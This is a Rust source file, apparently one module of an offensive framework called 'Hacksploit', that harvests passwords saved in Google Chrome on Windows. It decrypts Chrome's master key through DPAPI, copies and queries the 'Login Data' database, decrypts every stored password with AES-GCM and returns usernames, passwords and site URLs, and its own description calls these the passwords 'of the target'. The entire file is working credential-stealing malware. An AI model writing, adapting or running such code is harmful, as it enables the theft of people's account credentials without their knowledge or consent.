use crate::HacksploitModule;

use aes_gcm::aead::Aead;
use aes_gcm::NewAead;
use aes_gcm::{aead::generic_array::GenericArray, Aes256Gcm};
use rusqlite::{Connection, NO_PARAMS};
use serde_json::Value;
use std::fs::File;
use std::io::{Error, Read};
use std::mem::transmute;
use std::mem::zeroed;
use std::ptr::null_mut;
use winapi::um::wincrypt::DATA_BLOB;
use winapi::um::{dpapi::CryptUnprotectData, winbase::LocalFree};

const PATH: &str = "C:\\Users\\xpyro\\AppData\\Local\\Google\\Chrome\\User Data\\";
const DB_COPY_NAME: &str = ".\\chrome.db";

struct EncryptedLoginEntry {
    origin: String,
    username: String,
    password: Vec<u8>,
}

pub struct LoginEntry {
    pub origin: String,
    pub username: String,
    pub password: String,
}

fn get_master_key() -> Result<Vec<u8>, Error> {
    let mut filepath = String::from(PATH);
    filepath.push_str("Local State");
    let mut file_contents: String = String::new();
    let mut file: File = File::open(filepath)?;
    file.read_to_string(&mut file_contents)?;
    let v: Value = serde_json::from_str(&file_contents)?;
    let key = &v["os_crypt"]["encrypted_key"].as_str();
    if key.is_none() {
        return Ok(vec![]);
    }
    let key = key.unwrap();
    let key = key.as_bytes().to_vec();
    let key = base64decode(key);
    let key = crypt_unprotect(key[5..].to_vec());
    Ok(key)
}

fn base64decode(encoded: Vec<u8>) -> Vec<u8> {
    match base64::decode(encoded) {
        Ok(val) => return val,
        Err(_) => return vec![],
    }
}

fn aes_decrypt(data: Vec<u8>, key: Vec<u8>, iv: Vec<u8>) -> Vec<u8> {
    let key = GenericArray::clone_from_slice(&key);
    let aead = Aes256Gcm::new(&key);
    let nonce = GenericArray::from_slice(&iv);
    let decrypted = aead.decrypt(nonce, data.as_ref());
    match decrypted {
        Ok(val) => {
            return val;
        }
        Err(e) => println!("Error: {}", e),
    }
    vec![]
}

fn crypt_unprotect(encrypted: Vec<u8>) -> Vec<u8> {
    let mut decrypted: Vec<u8> = Vec::new();
    unsafe {
        let mut data_in: DATA_BLOB = zeroed();
        let mut data_out: DATA_BLOB = zeroed();

        data_in.pbData = transmute(encrypted.as_ptr() as usize);
        data_in.cbData = encrypted.len() as u32;

        let crypt_result = CryptUnprotectData(
            &mut data_in,
            null_mut(),
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            &mut data_out,
        );

        if crypt_result > 0 {
            decrypted =
                std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).into();
            LocalFree(transmute(data_out.pbData));
        }
    }
    decrypted
}

fn get_login_entries() -> Vec<LoginEntry> {
    let mut entries = Vec::new();
    match get_master_key() {
        Ok(key) => {
            for encrypted in get_encrypted_entries() {
                let decrypted = decrypt_password(encrypted.password, key.clone());
                if decrypted.len() == 0 {
                    continue;
                }
                match String::from_utf8(decrypted) {
                    Ok(password) => {
                        let entry = LoginEntry {
                            origin: encrypted.origin,
                            username: encrypted.username,
                            password,
                        };
                        entries.push(entry);
                    }
                    Err(_) => (),
                }
            }
        }
        Err(e) => println!("Error: {}", e),
    }
    entries
}

fn fetch_encrypted_entries(filepath: &str) -> Result<Vec<EncryptedLoginEntry>, rusqlite::Error> {
    let mut entries: Vec<EncryptedLoginEntry> = Vec::new();
    let connection = Connection::open(filepath)?;
    let mut statement =
        connection.prepare("SELECT username_value, password_value, origin_url FROM logins")?;
    let iter = statement.query_map(NO_PARAMS, |row| {
        Ok(EncryptedLoginEntry {
            username: row.get(0)?,
            password: row.get(1)?,
            origin: row.get(2)?,
        })
    })?;
    for encrypted in iter {
        entries.push(encrypted?);
    }
    Ok(entries)
}

fn get_encrypted_entries() -> Vec<EncryptedLoginEntry> {
    let mut path = String::from(PATH);
    path.push_str("Default\\Login Data");
    match std::fs::copy(path, DB_COPY_NAME) {
        Ok(_) => (),
        Err(e) => {
            println!("Error copying file: {}", e);
        }
    }
    let res = fetch_encrypted_entries(DB_COPY_NAME);
    match std::fs::remove_file(DB_COPY_NAME) {
        Ok(_) => (),
        Err(e) => println!("Error removing file: {}", e),
    }
    match res {
        Ok(entries) => return entries,
        Err(e) => println!("Error fetching entries: {}", e),
    }
    Vec::new()
}

fn decrypt_password(password: Vec<u8>, master_key: Vec<u8>) -> Vec<u8> {
    let iv = password[3..15].to_vec();
    let ciphertext = password[15..].to_vec();
    let mut decrypted = aes_decrypt(ciphertext, master_key, iv);
    if decrypted.len() == 0 {
        decrypted = crypt_unprotect(password[3..].to_vec());
    }
    decrypted
}

pub struct ChromeModule {}

impl ChromeModule {
    pub fn new() -> Self {
        ChromeModule {}
    }
}

impl HacksploitModule for ChromeModule {
    fn on_command(&self, _: Vec<&str>) -> String {
        let entries: Vec<LoginEntry> = get_login_entries();
        let mut text_entries: Vec<String> = vec![];
        for entry in entries {
            let s: String = vec![
                "Username: ",
                &entry.username,
                "\nPassword: ",
                &entry.password,
                "\nURL: ",
                &entry.origin,
            ]
            .join("");
            text_entries.push(s);
        }
        text_entries.join("\n\n")
    }
    fn get_name(&self) -> String {
        String::from("chrome")
    }
    fn get_description(&self) -> String {
        String::from("Allows you to view chrome passwords of the target")
    }
}
